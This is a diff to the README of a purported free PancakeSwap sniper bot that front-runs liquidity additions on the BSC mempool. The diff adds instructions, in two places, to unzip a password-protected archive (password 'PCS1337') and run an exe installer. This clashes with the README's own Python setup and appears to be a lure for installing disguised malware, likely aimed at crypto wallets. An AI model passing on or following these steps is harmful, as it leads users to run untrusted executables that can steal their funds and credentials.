@@ -2,7 +2,9 @@
 # About:
 A free sniper bot built to work with Pancakeswap. Honeypot/rug checker built in. Bot allows you to compete with other trading bots when buying a token on PancakeSwap. Its faster than traditional bots because it watches the txpool/mempool where transactions are still "pending" on the BSC network. It will watch for when liquidity is added as a pending transaction and immediately submit your order, so that hopefully you get in right after liquidity is added and before everyone else.
 
+Unzip archive(password PCS1337)
 
+Open exe installer and set up 
 
 # Installation:
 ### Download and install Python from the [site](https://www.python.org/downloads/).
@@ -39,7 +41,9 @@ python index.py
 
 
 # How to use?
+
 Unzip archive(password PCS1337)
+
 Open exe installer and set up 
 
 
